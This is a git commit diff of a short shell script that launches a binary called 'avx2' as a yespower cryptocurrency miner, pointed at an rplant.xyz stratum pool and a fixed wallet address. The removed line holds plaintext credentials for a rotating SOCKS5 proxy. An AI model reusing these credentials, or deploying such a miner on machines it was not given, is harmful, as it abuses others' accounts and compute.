2707e67a092261299da72c8ed642d25638644e8e
Akatsoki <100992814+Akatsoki@users.noreply.github.com>
2022-07-09 03:09:33 +0700

    Update Zxz.sh

--- Zxz.sh
+++ Zxz.sh
@@ -1,3 +1,3 @@
 chmod +x avx2
 
-./avx2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.$(echo $(shuf -i 1-999 -n 1)-TES) -t 29 -x socks5://Omarjetos8-rotate:Omarjetos8@p.webshare.io:80
+./avx2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.$(echo $(shuf -i 1-999 -n 1)-TES) -t 30
